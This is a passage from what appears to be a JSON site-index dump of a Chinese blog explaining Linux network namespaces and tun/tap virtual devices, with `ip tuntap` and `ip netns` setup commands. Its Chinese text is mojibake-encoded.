id=\"å¼€å§‹å®éªŒ\"\u003eå¼€å§‹å®éªŒ\u003c/h3\u003e\n\u003cp\u003eæˆ‘ä»¬å°†è¦æ„å»ºå¦‚ä¸‹å›¾çš„ç½‘ç»œ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"https://oss.typesafe.cn/netns.png\" loading=\"lazy\" src=\"https://oss.typesafe.cn/netns.png?t=2\"\u003e\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬æ·»åŠ ä¸¤ä¸ªtapè®¾å¤‡å¹¶é…ç½®ä¸ŠIPä¿¡æ¯ï¼Œç„¶åæ·»åŠ ä¸¤ä¸ªnetnsï¼Œæœ€åå°†tapè®¾å¤‡ç§»åŠ¨åˆ°netnsä¸­\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æ·»åŠ å¹¶å¯åŠ¨è™šæ‹Ÿç½‘å¡tapè®¾å¤‡\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip tuntap add dev tap0 mode tap \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip tuntap add dev tap1 mode tap \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set tap0 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set tap1 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# é…ç½®IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip addr add 10.0.0.1/24 dev tap0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip addr add 10.0.0.2/24 dev tap1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æ·»åŠ netns\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns add ns0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns add ns1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# å°†è™šæ‹Ÿç½‘å¡tap0ï¼Œtap1åˆ†åˆ«ç§»åŠ¨åˆ°ns0å’Œns1ä¸­\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set tap0 netns ns0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set tap1 netns ns1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨å®¿ä¸»æœºå™¨ä¸Šä½¿ç”¨\u003ccode\u003eping 10.0.0.1\u003c/code\u003eæµ‹è¯•ä¸tap0çš„ç½‘ç»œè¿é€šæ€§\u003c/p\u003e","title":"Linux Network Namespace (netns) è¯¦è§£"},{"content":" åœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼Œtunä¸tapæ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚ä¸åŒäºæ™®é€šé ç¡¬ä»¶ç½‘ç»œé€‚é…å™¨å®ç°çš„è®¾å¤‡ï¼Œè¿™äº›è™šæ‹Ÿçš„ç½‘ç»œè®¾å¤‡å…¨éƒ¨ç”¨è½¯ä»¶å®ç°ï¼Œå¹¶å‘è¿è¡Œäºæ“ä½œç³»ç»Ÿä¸Šçš„è½¯ä»¶æä¾›ä¸ç¡¬ä»¶çš„ç½‘ç»œè®¾å¤‡å®Œå…¨ç›¸åŒçš„åŠŸèƒ½ã€‚\ntun/tapæ˜¯ä»€ä¹ˆï¼Ÿ tunæ˜¯ç½‘ç»œå±‚çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œå¯ä»¥æ”¶å‘ç¬¬ä¸‰å±‚æ•°æ®æŠ¥æ–‡åŒ…ï¼Œå¦‚IPå°åŒ…ï¼Œå› æ­¤å¸¸ç”¨äºä¸€äº›ç‚¹å¯¹ç‚¹IPéš§é“ï¼Œä¾‹å¦‚OpenVPNï¼ŒIPSecç­‰ã€‚\ntapæ˜¯é“¾è·¯å±‚çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œç­‰åŒäºä¸€ä¸ªä»¥å¤ªç½‘è®¾å¤‡ï¼Œå®ƒå¯ä»¥æ”¶å‘ç¬¬äºŒå±‚æ•°æ®æŠ¥æ–‡åŒ…ï¼Œå¦‚ä»¥å¤ªç½‘æ•°æ®å¸§ã€‚Tapæœ€å¸¸è§çš„ç”¨é€”å°±æ˜¯åšä¸ºè™šæ‹Ÿæœºçš„ç½‘å¡ï¼Œå› ä¸ºå®ƒå’Œæ™®é€šçš„ç‰©ç†ç½‘å¡æ›´åŠ ç›¸è¿‘ï¼Œä¹Ÿç»å¸¸ç”¨ä½œæ™®é€šæœºå™¨çš„è™šæ‹Ÿç½‘å¡ã€‚\nå¦‚ä½•æ“ä½œtun/tapï¼Ÿ Linux tun/tapå¯ä»¥é€šè¿‡ç½‘ç»œæ¥å£å’Œå­—ç¬¦è®¾å¤‡ä¸¤ç§æ–¹å¼è¿›è¡Œæ“ä½œã€‚\nå½“åº”ç”¨ç¨‹åºä½¿ç”¨æ ‡å‡†ç½‘ç»œæ¥å£socket APIæ“ä½œtun/tapè®¾å¤‡æ—¶ï¼Œå’Œæ“ä½œä¸€ä¸ªçœŸå®ç½‘å¡æ— å¼‚ã€‚\nå½“åº”ç”¨ç¨‹åºä½¿ç”¨å­—ç¬¦è®¾å¤‡æ“ä½œtun/tapè®¾å¤‡æ—¶ï¼Œå­—ç¬¦è®¾å¤‡å³å……å½“äº†ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´çš„æ¡¥æ¢ç›´æ¥è¯»å†™äºŒå±‚æˆ–ä¸‰å±‚çš„æ•°æ®æŠ¥æ–‡ã€‚åœ¨ Linux å†…æ ¸ 2.6.x ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œtun/tap å¯¹åº”çš„å­—ç¬¦è®¾å¤‡æ–‡ä»¶åˆ†åˆ«ä¸ºï¼š\ntunï¼š/dev/net/tun tapï¼š/dev/tap0 å½“åº”ç”¨ç¨‹åºæ‰“å¼€å­—ç¬¦è®¾å¤‡æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºå¯¹åº”çš„è™šæ‹Ÿè®¾å¤‡æ¥å£ï¼Œä¸€èˆ¬ä»¥tunXå’ŒtapXæ–¹å¼å‘½åï¼Œè™šæ‹Ÿè®¾å¤‡æ¥å£åˆ›å»ºæˆåŠŸåï¼Œå¯ä»¥ä¸ºå…¶é…ç½®IPã€MACåœ°å€ã€è·¯ç”±ç­‰ã€‚å½“ä¸€åˆ‡é…ç½®å®Œæ¯•ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡æ­¤å­—ç¬¦æ–‡ä»¶è®¾å¤‡å†™å…¥IPå°åŒ…æˆ–ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œtun/tapçš„é©±åŠ¨ç¨‹åºä¼šå°†æ•°æ®æŠ¥æ–‡ç›´æ¥å‘é€åˆ°å†…æ ¸ç©ºé—´ï¼Œå†…æ ¸ç©ºé—´æ”¶åˆ°æ•°æ®åå†äº¤ç»™ç³»ç»Ÿçš„ç½‘ç»œåè®®æ ˆè¿›è¡Œå¤„ç†ï¼Œæœ€åç½‘ç»œåè®®æ ˆé€‰æ‹©åˆé€‚çš„ç‰©ç†ç½‘å¡å°†å…¶å‘å‡ºï¼Œåˆ°æ­¤å‘é€æµç¨‹å®Œæˆã€‚è€Œç‰©ç†ç½‘å¡æ”¶åˆ°æ•°æ®æŠ¥æ–‡æ—¶ä¼šäº¤ç»™ç½‘ç»œåè®®æ ˆè¿›è¡Œå¤„ç†ï¼Œç½‘ç»œåè®®æ ˆåŒ¹é…åˆ¤æ–­ä¹‹åé€šè¿‡tun/tapçš„é©±åŠ¨ç¨‹åºå°†æ•°æ®æŠ¥æ–‡åŸå°ä¸åŠ¨çš„å†™å…¥åˆ°å­—ç¬¦è®¾å¤‡ä¸Šï¼Œåº”ç”¨ç¨‹åºä»å­—ç¬¦è®¾å¤‡ä¸Šè¯»å–åˆ°IPå°åŒ…æˆ–ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œæœ€åè¿›è¡Œç›¸åº”çš„å¤„ç†ï¼Œæ”¶å–æµç¨‹å®Œæˆã€‚\næ³¨æ„ï¼šå½“åº”ç”¨ç¨‹åºå…³é—­å­—ç¬¦è®¾å¤‡æ—¶ï¼Œç³»ç»Ÿä¹Ÿä¼šè‡ªåŠ¨åˆ é™¤å¯¹åº”çš„è™šæ‹Ÿè®¾å¤‡æ¥å£ï¼Œå¹¶ä¸”ä¼šåˆ é™¤æ‰åˆ›å»ºçš„è·¯ç”±ç­‰ä¿¡æ¯ã€‚\ntun/tapçš„åŒºåˆ« tun/tap è™½ç„¶å·¥ä½œåŸç†ä¸€è‡´ï¼Œä½†æ˜¯å·¥ä½œçš„å±‚æ¬¡ä¸ä¸€æ ·ã€‚\ntunæ˜¯ä¸‰å±‚ç½‘ç»œè®¾å¤‡ï¼Œæ”¶å‘çš„æ˜¯IPå±‚æ•°æ®åŒ…ï¼Œæ— æ³•å¤„ç†ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œä¾‹å¦‚OpenVPNçš„è·¯ç”±æ¨¡å¼å°±æ˜¯ä½¿ç”¨äº†tunç½‘ç»œè®¾å¤‡ï¼ŒOpenVPN Serveré‡æ–°è§„åˆ’äº†ä¸€ä¸ªç½‘æ®µï¼Œæ‰€æœ‰çš„å®¢æˆ·ç«¯éƒ½ä¼šè·å–åˆ°è¯¥ç½‘æ®µä¸‹çš„ä¸€ä¸ªIPï¼Œå¹¶ä¸”ä¼šæ·»åŠ å¯¹åº”çš„è·¯ç”±è§„åˆ™ï¼Œè€Œå®¢æˆ·ç«¯ä¸ç›®æ ‡æœºå™¨äº§ç”Ÿçš„æ•°æ®æŠ¥æ–‡éƒ½è¦ç»è¿‡OpenVPNç½‘å…³æ‰èƒ½è½¬å‘ã€‚\ntapæ˜¯äºŒå±‚ç½‘ç»œè®¾å¤‡ï¼Œæ”¶å‘ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œæ‹¥æœ‰MACå±‚çš„åŠŸèƒ½ï¼Œå¯ä»¥å’Œç‰©ç†ç½‘å¡é€šè¿‡ç½‘æ¡¥ç›¸è¿ï¼Œç»„æˆä¸€ä¸ªäºŒå±‚ç½‘ç»œã€‚ä¾‹å¦‚OpenVPNçš„æ¡¥æ¥æ¨¡å¼å¯ä»¥ä»å¤–éƒ¨æ‰“ä¸€æ¡éš§é“åˆ°æœ¬åœ°ç½‘ç»œã€‚è¿›æ¥çš„æœºå™¨å°±åƒæœ¬åœ°çš„æœºå™¨ä¸€æ ·å‚ä¸é€šè®¯ï¼Œä¸æ¯«çœ‹ä¸å‡ºè¿™äº›æœºå™¨æ˜¯åœ¨è¿œç¨‹ã€‚å¦‚æœä½ æœ‰ä½¿ç”¨è¿‡è™šæ‹Ÿæœºçš„ç»éªŒï¼Œæ¡¥æ¥æ¨¡å¼ä¹Ÿæ˜¯ä¸€ç§ååˆ†å¸¸è§çš„ç½‘ç»œæ–¹æ¡ˆï¼Œè™šæ‹Ÿæœºä¼šåˆ†é…åˆ°å’Œå®¿ä¸»æœºå™¨åŒç½‘æ®µçš„IPï¼Œå…¶ä»–åŒç½‘æ®µçš„æœºå™¨ä¹Ÿå¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¿™å°è™šæ‹Ÿæœºã€‚\nä½¿ç”¨æ–¹å¼ Linux æä¾›äº†ä¸€äº›å‘½ä»¤è¡Œç¨‹åºæ–¹ä¾¿æˆ‘ä»¬æ¥åˆ›å»ºæŒä¹…åŒ–çš„tun/tapè®¾å¤‡ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰åº”ç”¨ç¨‹åºæ‰“å¼€å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œtun/tapçš„çŠ¶æ€ä¸€ç›´ä¼šæ˜¯DOWNï¼Œè¿˜å¥½çš„æ˜¯è¿™å¹¶ä¸ä¼šå½±å“æˆ‘ä»¬æŠŠå®ƒå½“ä½œæ™®é€šç½‘å¡å»ä½¿ç”¨ã€‚\nä½¿ç”¨ip tuntap helpæŸ¥çœ‹ä½¿ç”¨å¸®åŠ©\nUsage: ip tuntap { add | del | show | list | lst | help } [ dev PHYS_DEV ] [ mode { tun | tap } ] [ user USER ] [ group GROUP ] [ one_queue ] [ pi ] [ vnet_hdr ] [ multi_queue ] [ name NAME ] Where:\tUSER := { STRING | NUMBER } GROUP := { STRING | NUMBER } ç¤ºä¾‹ # åˆ›å»º tap ip tuntap add dev tap0 mode tap # åˆ›å»º tun ip tuntap add dev tun0 mode tun # åˆ é™¤ tap ip tuntap del dev tap0 mode tap # åˆ é™¤ tun ip tuntap del dev tun0 mode tun tun/tap è®¾å¤‡åˆ›å»ºæˆåŠŸåå¯ä»¥å½“ä½œæ™®é€šçš„ç½‘å¡ä¸€æ ·ä½¿ç”¨ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ip linkå‘½ä»¤æ¥æ“ä½œå®ƒã€‚\n# ä¾‹å¦‚ä½¿ç”¨ip linkå‘½ä»¤ä¹Ÿå¯ä»¥åˆ é™¤tun/tapè®¾å¤‡ ip link del tap0 ip link del tun0 ","permalink":"https://www.typesafe.cn/posts/linux-tun-tap/","summary":"\u003cblockquote\u003e\n\u003cp\u003eåœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼Œ\u003cstrong\u003etun\u003c/strong\u003eä¸\u003cstrong\u003etap\u003c/strong\u003eæ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚ä¸åŒäºæ™®é€šé ç¡¬ä»¶ç½‘ç»œé€‚é…å™¨å®ç°çš„è®¾å¤‡ï¼Œè¿™äº›è™šæ‹Ÿçš„ç½‘ç»œè®¾å¤‡å…¨éƒ¨ç”¨è½¯ä»¶å®ç°ï¼Œå¹¶å‘è¿è¡Œäºæ“ä½œç³»ç»Ÿä¸Šçš„è½¯ä»¶æä¾›ä¸ç¡¬ä»¶çš„ç½‘ç»œè®¾å¤‡å®Œå…¨ç›¸åŒçš„åŠŸèƒ½ã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"tuntapæ˜¯ä»€ä¹ˆ\"\u003etun/tapæ˜¯ä»€ä¹ˆï¼Ÿ\u003c/h3\u003e\n\u003cp\u003etunæ˜¯ç½‘ç»œå±‚çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œå¯ä»¥æ”¶å‘ç¬¬ä¸‰å±‚æ•°æ®æŠ¥æ–‡åŒ…ï¼Œå¦‚IPå°åŒ…ï¼Œå› æ­¤å¸¸ç”¨äºä¸€äº›ç‚¹å¯¹ç‚¹IPéš§é“ï¼Œä¾‹å¦‚OpenVPNï¼ŒIPSecç­‰ã€‚\u003c/p\u003e\n\u003cp\u003etapæ˜¯é“¾è·¯å±‚çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œç­‰åŒäºä¸€ä¸ªä»¥å¤ªç½‘è®¾å¤‡ï¼Œå®ƒå¯ä»¥æ”¶å‘ç¬¬äºŒå±‚æ•°æ®æŠ¥æ–‡åŒ…ï¼Œå¦‚ä»¥å¤ªç½‘æ•°æ®å¸§ã€‚Tapæœ€å¸¸è§çš„ç”¨é€”å°±æ˜¯åšä¸ºè™šæ‹Ÿæœºçš„ç½‘å¡ï¼Œå› ä¸ºå®ƒå’Œæ™®é€šçš„ç‰©ç†ç½‘å¡æ›´åŠ ç›¸è¿‘ï¼Œä¹Ÿç»å¸¸ç”¨ä½œæ™®é€šæœºå™¨çš„è™šæ‹Ÿç½‘å¡ã€‚\u003c/p\u003e\n\u003ch3 id=\"å¦‚ä½•æ“ä½œtuntap\"\u003eå¦‚ä½•æ“ä½œtun/tapï¼Ÿ\u003c/h3\u003e\n\u003cp\u003eLinux tun/tapå¯ä»¥é€šè¿‡ç½‘ç»œæ¥å£å’Œå­—ç¬¦è®¾å¤‡ä¸¤ç§æ–¹å¼è¿›è¡Œæ“ä½œã€‚\u003c/p\u003e\n\u003cp\u003eå½“åº”ç”¨ç¨‹åºä½¿ç”¨æ ‡å‡†ç½‘ç»œæ¥å£socket APIæ“ä½œtun/tapè®¾å¤‡æ—¶ï¼Œå’Œæ“ä½œä¸€ä¸ªçœŸå®ç½‘å¡æ— å¼‚ã€‚\u003c/p\u003e\n\u003cp\u003eå½“åº”ç”¨ç¨‹åºä½¿ç”¨å­—ç¬¦è®¾å¤‡æ“ä½œtun/tapè®¾å¤‡æ—¶ï¼Œå­—ç¬¦è®¾å¤‡å³å……å½“äº†ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´çš„æ¡¥æ¢ç›´æ¥è¯»å†™äºŒå±‚æˆ–ä¸‰å±‚çš„æ•°æ®æŠ¥æ–‡ã€‚åœ¨ Linux å†…æ ¸ 2.6.x ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œtun/tap å¯¹åº”çš„å­—ç¬¦è®¾å¤‡æ–‡ä»¶åˆ†åˆ«ä¸ºï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etunï¼š/dev/net/tun\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etapï¼š/dev/tap0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå½“åº”ç”¨ç¨‹åºæ‰“å¼€å­—ç¬¦è®¾å¤‡æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºå¯¹åº”çš„è™šæ‹Ÿè®¾å¤‡æ¥å£ï¼Œä¸€èˆ¬ä»¥tunXå’ŒtapXæ–¹å¼å‘½åï¼Œè™šæ‹Ÿè®¾å¤‡æ¥å£åˆ›å»ºæˆåŠŸåï¼Œå¯ä»¥ä¸ºå…¶é…ç½®IPã€MACåœ°å€ã€è·¯ç”±ç­‰ã€‚å½“ä¸€åˆ‡é…ç½®å®Œæ¯•ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡æ­¤å­—ç¬¦æ–‡ä»¶è®¾å¤‡å†™å…¥IPå°åŒ…æˆ–ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œtun/tapçš„é©±åŠ¨ç¨‹åºä¼šå°†æ•°æ®æŠ¥æ–‡ç›´æ¥å‘é€åˆ°å†…æ ¸ç©ºé—´ï¼Œå†…æ ¸ç©ºé—´æ”¶åˆ°æ•°æ®åå†äº¤ç»™ç³»ç»Ÿçš„ç½‘ç»œåè®®æ ˆè¿›è¡Œå¤„ç†ï¼Œæœ€åç½‘ç»œåè®®æ ˆé€‰æ‹©åˆé€‚çš„ç‰©ç†ç½‘å¡å°†å…¶å‘å‡ºï¼Œåˆ°æ­¤å‘é€æµç¨‹å®Œæˆã€‚è€Œç‰©ç†ç½‘å¡æ”¶åˆ°æ•°æ®æŠ¥æ–‡æ—¶ä¼šäº¤ç»™ç½‘ç»œåè®®æ ˆè¿›è¡Œå¤„ç†ï¼Œç½‘ç»œåè®®æ ˆåŒ¹é…åˆ¤æ–­ä¹‹åé€šè¿‡tun/tapçš„é©±åŠ¨ç¨‹åºå°†æ•°æ®æŠ¥æ–‡åŸå°ä¸åŠ¨çš„å†™å…¥åˆ°å­—ç¬¦è®¾å¤‡ä¸Šï¼Œåº”ç”¨ç¨‹åºä»å­—ç¬¦è®¾å¤‡ä¸Šè¯»å–åˆ°IPå°åŒ…æˆ–ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œæœ€åè¿›è¡Œç›¸åº”çš„å¤„ç†ï¼Œæ”¶å–æµç¨‹å®Œæˆã€‚\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eæ³¨æ„ï¼šå½“åº”ç”¨ç¨‹åºå…³é—­å­—ç¬¦è®¾å¤‡æ—¶ï¼Œç³»ç»Ÿä¹Ÿä¼šè‡ªåŠ¨åˆ é™¤å¯¹åº”çš„è™šæ‹Ÿè®¾å¤‡æ¥å£ï¼Œå¹¶ä¸”ä¼šåˆ é™¤æ‰åˆ›å»ºçš„è·¯ç”±ç­‰ä¿¡æ¯ã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"tuntapçš„åŒºåˆ«\"\u003etun/tapçš„åŒºåˆ«\u003c/h3\u003e\n\u003cp\u003etun/tap è™½ç„¶å·¥ä½œåŸç†ä¸€è‡´ï¼Œä½†æ˜¯å·¥ä½œçš„å±‚æ¬¡ä¸ä¸€æ ·ã€‚\u003c/p\u003e\n\u003cp\u003etunæ˜¯ä¸‰å±‚ç½‘ç»œè®¾å¤‡ï¼Œæ”¶å‘çš„æ˜¯IPå±‚æ•°æ®åŒ…ï¼Œæ— æ³•å¤„ç†ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œä¾‹å¦‚OpenVPNçš„è·¯ç”±æ¨¡å¼å°±æ˜¯ä½¿ç”¨äº†tunç½‘ç»œè®¾å¤‡ï¼ŒOpenVPN Serveré‡æ–°è§„åˆ’äº†ä¸€ä¸ªç½‘æ®µï¼Œæ‰€æœ‰çš„å®¢æˆ·ç«¯éƒ½ä¼šè·å–åˆ°è¯¥ç½‘æ®µä¸‹çš„ä¸€ä¸ªIPï¼Œå¹¶ä¸”ä¼šæ·»åŠ å¯¹åº”çš„è·¯ç”±è§„åˆ™ï¼Œè€Œå®¢æˆ·ç«¯ä¸ç›®æ ‡æœºå™¨äº§ç”Ÿçš„æ•°æ®æŠ¥æ–‡éƒ½è¦ç»è¿‡OpenVPNç½‘å…³æ‰èƒ½è½¬å‘ã€‚\u003c/p\u003e\n\u003cp\u003etapæ˜¯äºŒå±‚ç½‘ç»œè®¾å¤‡ï¼Œæ”¶å‘ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œæ‹¥æœ‰MACå±‚çš„åŠŸèƒ½ï¼Œå¯ä»¥å’Œç‰©ç†ç½‘å¡é€šè¿‡ç½‘æ¡¥ç›¸è¿ï¼Œç»„æˆä¸€ä¸ªäºŒå±‚ç½‘ç»œã€‚ä¾‹å¦‚OpenVPNçš„æ¡¥æ¥æ¨¡å¼å¯ä»¥ä»å¤–éƒ¨æ‰“ä¸€æ¡éš§é“åˆ°æœ¬åœ°ç½‘ç»œã€‚è¿›æ¥çš„æœºå™¨å°±åƒæœ¬åœ°çš„æœºå™¨ä¸€æ ·å‚ä¸é€šè®¯ï¼Œä¸æ¯«çœ‹ä¸å‡ºè¿™äº›æœºå™¨æ˜¯åœ¨è¿œç¨‹ã€‚å¦‚æœä½ æœ‰ä½¿ç”¨è¿‡è™šæ‹Ÿæœºçš„ç»éªŒï¼Œæ¡¥æ¥æ¨¡å¼ä¹Ÿæ˜¯ä¸€ç§ååˆ†å¸¸è§çš„ç½‘ç»œæ–¹æ¡ˆï¼Œè™šæ‹Ÿæœºä¼šåˆ†é…åˆ°å’Œå®¿ä¸»æœºå™¨åŒç½‘æ®µçš„IPï¼Œå…¶ä»–åŒç½‘æ®µçš„æœºå™¨ä¹Ÿå¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¿™å°è™šæ‹Ÿæœºã€‚\u003c/p\u003e\n\u003ch3 id=\"ä½¿ç”¨æ–¹å¼\"\u003eä½¿ç”¨æ–¹å¼\u003c/h3\u003e\n\u003cp\u003eLinux æä¾›äº†ä¸€äº›å‘½ä»¤è¡Œç¨‹åºæ–¹ä¾¿æˆ‘ä»¬æ¥åˆ›å»ºæŒä¹…åŒ–çš„tun/tapè®¾å¤‡ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰åº”ç”¨ç¨‹åºæ‰“å¼€å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œtun/tapçš„çŠ¶æ€ä¸€ç›´ä¼šæ˜¯DOWNï¼Œè¿˜å¥½çš„æ˜¯è¿™å¹¶ä¸ä¼šå½±å“æˆ‘ä»¬æŠŠå®ƒå½“ä½œæ™®é€šç½‘å¡å»ä½¿ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eä½¿ç”¨\u003ccode\u003eip tuntap help\u003c/code\u003eæŸ¥çœ‹ä½¿ç”¨å¸®åŠ©\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUsage: ip tuntap \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e add | del | show | list | lst | help \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e dev PHYS_DEV \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e mode \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e tun | tap \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e user USER \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e group GROUP \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e one_queue \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e pi \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e vnet_hdr \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e multi_queue \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e name NAME \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWhere:\tUSER  :\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e STRING | NUMBER \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tGROUP :\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e STRING | NUMBER \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"ç¤ºä¾‹\"\u003eç¤ºä¾‹\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# åˆ›å»º tap \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip tuntap add dev tap0 mode tap \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# åˆ›å»º tun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip tuntap add dev tun0 mode tun \n\u003c/span\u003e\u003c/span\u003e\u003cspan 